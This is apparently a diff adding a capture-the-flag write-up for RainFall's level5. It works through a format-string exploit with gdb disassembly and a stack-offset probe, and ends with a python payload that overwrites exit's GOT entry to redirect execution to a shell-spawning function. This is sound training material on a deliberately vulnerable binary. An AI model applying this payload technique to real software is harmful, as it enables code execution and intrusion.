@@ -1,0 +1,58 @@
+level5
+
+this time our second function doesnt call the third function where the shell is.
+so we need to to overwrite a jump to address to call the address of the o function
+
+first thing we need to get the o function address
+
+(gdb) x o
+0x80484a4 <o>:	0x83e58955
+(gdb)
+
+o address is 0x80484a4
+
+(gdb) disas n
+Dump of assembler code for function n:
+   0x080484c2 <+0>:	push   ebp
+   0x080484c3 <+1>:	mov    ebp,esp
+   0x080484c5 <+3>:	sub    esp,0x218
+   0x080484cb <+9>:	mov    eax,ds:0x8049848
+   0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax
+   0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200
+   0x080484dc <+26>:	lea    eax,[ebp-0x208]
+   0x080484e2 <+32>:	mov    DWORD PTR [esp],eax
+   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
+   0x080484ea <+40>:	lea    eax,[ebp-0x208]
+   0x080484f0 <+46>:	mov    DWORD PTR [esp],eax
+   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
+   0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1
+   0x080484ff <+61>:	call   0x80483d0 <exit@plt> # we will try to overwrite the exit jump
+End of assembler dump.
+(gdb) disas 0x80483d0                               # disas exit call
+Dump of assembler code for function exit@plt:
+   0x080483d0 <+0>:	jmp    DWORD PTR ds:0x8049838   #this is the jump we need that call global offset table (got) glibc exit 
+   0x080483d6 <+6>:	push   0x28
+   0x080483db <+11>:	jmp    0x8048370
+End of assembler dump.
+(gdb) x/s 0x8049838
+0x8049838 <exit@got.plt>:	 "փ\004\b\346\203\004\b"
+(gdb)
+
+the address that we will overwrite is 0x8049838=litleendian>\x38\x98\x04\x08
+now lets find the position on stack :
+
+level5@RainFall:~$ ./level5
+AAAA %x %x %x %x %x %x
+AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825
+level5@RainFall:~$
+the fourth position
+
+now lets convert the hex of the o function to decimal :
+
+80484a4=decimal>134513828
+we need to sub 4 bytes of the exit got address in the payload
+so the final payload will be somthing like:
+
+(python -c "print('\x38\x98\x04\x08' + '%134513824u%4\$n')" ; cat) | ./level5
+
+sources : https://www.youtube.com/watch?v=t1LH9D5cuK4
